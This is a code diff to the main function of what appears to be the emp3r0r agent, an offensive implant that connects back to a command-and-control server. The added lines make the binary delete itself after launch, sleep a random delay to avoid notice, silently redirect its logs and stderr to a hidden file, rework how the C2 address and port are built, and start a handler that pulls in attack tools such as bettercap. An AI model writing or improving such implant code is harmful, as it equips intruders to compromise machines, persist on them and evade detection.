@@ -13,6 +13,7 @@ import (
 	"os/exec"
 	"os/user"
 	"strings"
+	"syscall"
 	"time"
 
 	"github.com/google/uuid"
@@ -42,14 +43,40 @@ func main() {
 		return
 	}
 
+	// self delete
+	err = os.Remove(os.Args[0])
+	if err != nil {
+		log.Printf("Self delete: %v", err)
+	}
+
 	// don't be hasty
 	time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)
+
+	// mkdir -p UtilsPath
+	if !util.IsFileExist(emp3r0r_data.UtilsPath) {
+		err = os.MkdirAll(emp3r0r_data.UtilsPath, 0700)
+		if err != nil {
+			log.Fatalf("[-] Cannot mkdir %s: %v", emp3r0r_data.AgentRoot, err)
+		}
+	}
 
 	// silent switch
 	log.SetOutput(ioutil.Discard)
 	if !*silent {
 		fmt.Println("emp3r0r agent has started")
 		log.SetOutput(os.Stderr)
+
+		// redirect everything to log file
+		f, err := os.OpenFile(emp3r0r_data.AgentRoot+"/emp3r0r.log", os.O_RDWR|os.O_CREATE, 0600)
+		if err != nil {
+			log.Fatalf("error opening emp3r0r.log: %v", err)
+		}
+		defer f.Close()
+		log.SetOutput(f)
+		err = syscall.Dup2(int(f.Fd()), int(os.Stderr.Fd()))
+		if err != nil {
+			log.Fatalf("Cannot redirect stderr to log file: %v", err)
+		}
 	}
 
 	// PATH
@@ -62,13 +89,6 @@ func main() {
 		os.Setenv("HOME", u.HomeDir)
 	}
 
-	// mkdir -p UtilsPath
-	if !util.IsFileExist(emp3r0r_data.UtilsPath) {
-		err = os.MkdirAll(emp3r0r_data.UtilsPath, 0700)
-		if err != nil {
-			log.Fatalf("[-] Cannot mkdir %s: %v", emp3r0r_data.AgentRoot, err)
-		}
-	}
 	// extract bash
 	err = agent.ExtractBash()
 	if err != nil {
@@ -126,12 +146,7 @@ func main() {
 
 	// parse C2 address
 	emp3r0r_data.CCIP = strings.Split(emp3r0r_data.CCAddress, "/")[2]
-	// if not using IP as C2, we assume CC is proxied by CDN/tor, thus using default 443 port
-	if tun.ValidateIP(emp3r0r_data.CCIP) {
-		emp3r0r_data.CCAddress = fmt.Sprintf("%s:%s/", emp3r0r_data.CCAddress, emp3r0r_data.CCPort)
-	} else {
-		emp3r0r_data.CCAddress += "/"
-	}
+	emp3r0r_data.CCAddress = fmt.Sprintf("%s:%s/", emp3r0r_data.CCAddress, emp3r0r_data.CCPort)
 
 	// if CC is behind tor, a proxy is needed
 	if tun.IsTor(emp3r0r_data.CCAddress) {
@@ -296,6 +311,9 @@ connect:
 		goto connect
 	}
 	log.Println("Connected to CC TunAPI")
+	if !util.IsFileExist(emp3r0r_data.UtilsPath + "/bettercap") {
+		go agent.VaccineHandler()
+	}
 	err = agent.CCMsgTun(ctx, cancel)
 	if err != nil {
 		log.Printf("CCMsgTun: %v, reconnecting...", err)
